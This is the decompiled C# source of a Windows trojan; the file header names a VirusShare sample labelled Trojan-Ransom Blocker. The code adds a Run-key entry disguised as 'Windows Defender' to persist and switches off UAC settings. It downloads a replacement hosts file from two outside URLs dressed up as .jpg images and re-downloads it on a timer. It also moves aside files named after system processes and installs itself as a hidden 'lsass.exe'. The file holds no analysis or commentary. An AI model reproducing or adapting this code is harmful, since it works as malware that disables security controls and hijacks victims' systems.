// Decompiled with JetBrains decompiler
// Type: Bravo.Form1
// Assembly: Bravo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3392EA4-341B-4F26-A533-E4F5D52B25A2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00014-msil\Trojan-Ransom.Win32.Blocker.ikgv-8675aa6385aa1ea9e78d495d03236a2cc4098a3c5b391c2119cd06a18461c139.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace Bravo
{
  public class Form1 : Form
  {
    private IContainer components = (IContainer) null;
    private System.Windows.Forms.Timer timer1;
    private string ruta;
    private string ruta1;
    private string ruta2;
    private string ruta3;
    private string name;
    private string dir;
    private string url1;
    private string url2;
    private bool exist;
    private long numero;
    private long cont;
    private WebClient webClient = new WebClient();

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 266);
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public Form1() => this.InitializeComponent();

    public string yateloprpare(string urlx)
    {
      try
      {
        HttpWebResponse response = (HttpWebResponse) WebRequest.Create(urlx).GetResponse();
        return "OK";
      }
      catch (Exception ex)
      {
        return "No vale";
      }
    }

    public void RunStartup() => Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows Defender", (object) this.ruta);

    public bool chopelaquichatero()
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
      registryKey.SetValue("EnableLUA", (object) 0);
      registryKey.SetValue("EnableSecureUIAPaths", (object) 0);
      registryKey.SetValue("FilterAdministratorToken", (object) 0);
      registryKey.SetValue("ValidateAdminCodeSignatures", (object) 0);
      registryKey.SetValue("EnableUIADesktopToggle", (object) 0);
      registryKey.SetValue("ConsentPromptBehaviorAdmin", (object) 0);
      registryKey.SetValue("EnableInstallerDetection", (object) 0);
      this.RunStartup();
      registryKey.Close();
      return true;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.url1 = "http://www.diocesiscoriacaceres.es/menuderecho/IIICongreso/logoencuentros.jpg";
      this.url2 = "http://www.mbaparksevents.com/ficheros/30c1_3_120_1701.jpg";
      this.dir = "C:\\Windows\\System32\\drivers\\etc\\hosts";
      this.ruta = "C:\\WINDOWS\\system32\\drivers\\lsass.exe";
      this.ruta1 = "C:\\WINDOWS\\system32\\drivers\\winlogon.exe";
      this.ruta2 = "C:\\WINDOWS\\system32\\drivers\\csrss.exe";
      this.ruta3 = "C:\\WINDOWS\\system32\\drivers\\smss.exe";
      this.name = "PostalTerra";
      this.cont = 0L;
      this.timer1.Enabled = true;
      this.chopelaquichatero();
      Random random = new Random(DateTime.Now.Millisecond);
      this.numero = (long) random.Next(10000, 100000);
      this.exist = System.IO.File.Exists(this.dir);
      if (this.exist)
        System.IO.File.Move(this.dir, "C:\\Windows\\System32\\drivers\\etc\\" + Convert.ToString(this.numero));
      if (this.yateloprpare(this.url1) == "OK")
        this.webClient.DownloadFile(this.url1, this.dir);
      else if (this.yateloprpare(this.url2) == "OK")
        this.webClient.DownloadFile(this.url2, this.dir);
      this.numero = (long) random.Next(10000, 100000);
      this.exist = System.IO.File.Exists(this.ruta1);
      if (this.exist)
        System.IO.File.Move(this.ruta1, "C:\\WINDOWS\\system32\\drivers\\" + Convert.ToString(this.numero));
      this.numero = (long) random.Next(10000, 100000);
      this.exist = System.IO.File.Exists(this.ruta2);
      if (this.exist)
        System.IO.File.Move(this.ruta2, "C:\\WINDOWS\\system32\\drivers\\" + Convert.ToString(this.numero));
      this.numero = (long) random.Next(10000, 100000);
      this.exist = System.IO.File.Exists(this.ruta3);
      if (this.exist)
        System.IO.File.Move(this.ruta3, "C:\\WINDOWS\\system32\\drivers\\" + Convert.ToString(this.numero));
      this.exist = System.IO.File.Exists(this.ruta);
      if (this.exist)
        return;
      System.IO.File.Copy(this.name + ".exe", this.ruta);
      System.IO.File.SetAttributes(this.ruta, FileAttributes.Hidden);
      System.IO.File.SetAttributes(this.ruta, FileAttributes.System);
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      ++this.cont;
      if (this.cont != 36000L)
        return;
      this.numero = (long) new Random(DateTime.Now.Millisecond).Next(10000, 100000);
      this.exist = System.IO.File.Exists(this.dir);
      if (this.exist)
        System.IO.File.Move(this.dir, "C:\\Windows\\System32\\drivers\\etc\\" + Convert.ToString(this.numero));
      if (this.yateloprpare(this.url1) == "OK")
        this.webClient.DownloadFile(this.url1, this.dir);
      else if (this.yateloprpare(this.url2) == "OK")
        this.webClient.DownloadFile(this.url2, this.dir);
      this.cont = 0L;
    }
  }
}
